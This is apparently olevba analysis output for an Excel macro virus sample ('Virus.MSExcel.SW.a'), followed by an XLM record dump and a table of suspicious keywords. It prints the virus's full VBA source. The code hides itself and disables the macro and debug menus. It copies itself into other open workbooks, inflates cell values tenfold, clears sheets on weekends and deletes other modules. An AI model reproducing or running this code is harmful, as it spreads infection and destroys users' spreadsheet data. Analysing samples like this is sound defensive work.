olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.SW.a-29e444d3f316223a9f58838afc5b1fe8031aca42
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO sw.bas 
in file: Virus.MSExcel.SW.a-29e444d3f316223a9f58838afc5b1fe8031aca42 - OLE stream: '_VBA_PROJECT_CUR/VBA/sw'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'F051C320071ABCE57ADB4C960D7B44E91BC285
Declare Function GetCurrentTime Lib "USER" () As Long
Attribute GetCurrentTime.VB_ProcData.VB_Invoke_Func = " \n14"
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "no"
End Sub
Sub no()
Attribute no.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.EnableCancelKey = xlDisabled
pawn$ = ActiveWorkbook.Name
pawns$ = ActiveWorkbook.ActiveSheet.Name
If ActiveWorkbook.Sheets("sw").Visible = True Then ActiveWorkbook.Sheets("sw").Visible = False
Application.MenuBars(xlWorksheet).Menus("tools").MenuItems("macro...").Delete
Application.MenuBars(xlWorksheet).Menus("tools").MenuItems.Add Caption:="&Macro...", OnAction:="", before:="record macro"
Application.MenuBars(xlNoDocuments).Menus("file").MenuItems("macro...").Delete
Application.MenuBars(xlNoDocuments).Menus("file").MenuItems.Add Caption:="&Macro...", OnAction:="", before:="record new macro..."
Application.MenuBars(xlModule).Menus("tools").MenuItems("macro...").Delete
Application.MenuBars(xlModule).Menus("tools").MenuItems.Add Caption:="&Macro...", OnAction:="", before:="record macro"
Application.MenuBars(xlModule).Menus("tools").MenuItems("menu editor...").Delete
Application.MenuBars(xlModule).Menus("tools").MenuItems.Add Caption:="Menu E&ditor...", OnAction:="", before:="attach toolbars..."
Application.MenuBars(xlModule).Menus("run").MenuItems("start").Delete
Application.MenuBars(xlModule).Menus("run").MenuItems.Add Caption:="S&tart", before:="end", OnAction:=""
Application.MenuBars(xlModule).Menus("run").MenuItems("step into").Delete
Application.MenuBars(xlModule).Menus("run").MenuItems.Add Caption:="Step &Into", before:="step over", OnAction:=""
Application.MenuBars(xlChart).Menus("tools").MenuItems("macro...").Delete
Application.MenuBars(xlChart).Menus("tools").MenuItems.Add Caption:="&Macro...", OnAction:="", before:="record macro"
Application.MenuBars(xlWorksheet).Menus("view").MenuItems("toolbars...").Delete
Application.MenuBars(xlWorksheet).Menus("view").MenuItems.Add Caption:="&Toolbars...", OnAction:="", before:=3
Application.MenuBars(xlModule).Menus("view").MenuItems("toolbars...").Delete
Application.MenuBars(xlModule).Menus("view").MenuItems.Add Caption:="&Toolbars...", OnAction:="", before:=3
Application.MenuBars(xlModule).Menus("view").MenuItems("debug window").Delete
Application.MenuBars(xlModule).Menus("view").MenuItems.Add Caption:="&Debug Window", OnAction:=""
Application.OnKey "{F5}", ""
Application.OnKey "{F8}", ""
Application.OnKey "^g", ""
Application.MenuBars(xlChart).Menus("view").MenuItems("toolbars...").Delete
Application.MenuBars(xlChart).Menus("view").MenuItems.Add Caption:="&Toolbars...", OnAction:="", before:=3
Application.ShortcutMenus(xlToolbar).MenuItems("toolbars...").Delete
Application.ShortcutMenus(xlToolbar).MenuItems.Add Caption:="Toolbars...", OnAction:=""
Application.ShortcutMenus(xlToolbar).MenuItems("customize...").Delete
Application.ShortcutMenus(xlToolbar).MenuItems.Add Caption:="Customize...", OnAction:=""
tc = Toolbars.Count
For s = 1 To tc
ttc = Toolbars(s).ToolbarButtons.Count
For t = 1 To ttc
If InStr("Run MacroStep IntoStep MacroMenu Editor", Toolbars(s).ToolbarButtons(t).Name) <> 0 And Toolbars(s).ToolbarButtons(t).Name <> "" Then Toolbars(s).ToolbarButtons(t).Enabled = False
Next t
Next s
wc = Workbooks.Count
If wc < 2 Then GoTo bye
Application.ScreenUpdating = False
j = 1
Do While j <= wc
wmc = Workbooks(j).Modules.Count
m = 1
Do While wmc > 0 And m <= wmc
If Workbooks(j).Modules(m).Name = "sw" Then Exit Do
m = m + 1
Loop
If m <= wmc Then Exit Do
j = j + 1
Loop
For i = 1 To wc
wmc = Workbooks(i).Sheets.Count
For n = 1 To wmc
If Workbooks(i).Sheets(n).Name = "sw" Then GoTo nexti
Next n
GoTo nfct
nexti:
Next i
GoTo bye
nfct:
wn$ = Workbooks(i).Name
Workbooks(j).Sheets("sw").Visible = True
Workbooks(j).Sheets("sw").Copy before:=Workbooks(i).Sheets(1)
Workbooks(j).Sheets("sw").Visible = False
Workbooks(i).Sheets("sw").Visible = False
Workbooks(i).Sheets("sw").Protect DrawingObjects:=True, Contents:=True, Scenarios:=True
If Left(wn$, 4) <> "Book" Then
Workbooks(wn$).Save
End If
Workbooks(pawn$).Sheets(pawns$).Activate
bye:
tu = GetCurrentTime() / 60000
Do While tu > 60
For Each cell In ActiveSheet.Range("b4", "g40")
cell.FormulaR1C1 = cell.FormulaR1C1 * 10
Next cell
awn$ = ActiveWorkbook.Name
If Left(awn$, 4) <> "Book" Then
Workbooks(awn$).Save
End If
Exit Do
Loop
Do While tu > 30
If WeekDay(Now) = 1 Or WeekDay(Now) = 7 Then
MsgBox "Today is rest day!" & Chr(10) & "Why do you work so hard?" & Chr(10) & "All work and no play make you a dull boy!" & Chr(10) & "Come on! Let's go out and have some fun!", vbCritical + vbApplicationModal, "Ha! Ha! Ha! Idiot ! ! !"
ActiveSheet.Cells.ClearContents
awn$ = ActiveWorkbook.Name
If Left(awn$, 4) <> "Book" Then
Workbooks(awn$).Save
End If
End If
Exit Do
Loop
awmc = ActiveWorkbook.Modules.Count
Do While awmc > 1
For w = 1 To awmc
If ActiveWorkbook.Modules(w).Name <> "sw" Then
ActiveWorkbook.Modules(w).Delete
w = w - 1
awmc = ActiveWorkbook.Modules.Count
If w = awmc Then Exit Do
End If
Next w
Loop
Application.ScreenUpdating = True
End Sub
Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
awmc = ActiveWorkbook.Modules.Count
Do While awmc > 1
For w = 1 To awmc
If ActiveWorkbook.Modules(w).Name <> "sw" Then
ActiveWorkbook.Modules(w).Delete
w = w - 1
awmc = ActiveWorkbook.Modules.Count
If w = awmc Then Exit Do
End If
Next w
Loop
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     10 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  s
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |~)^                 |file                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

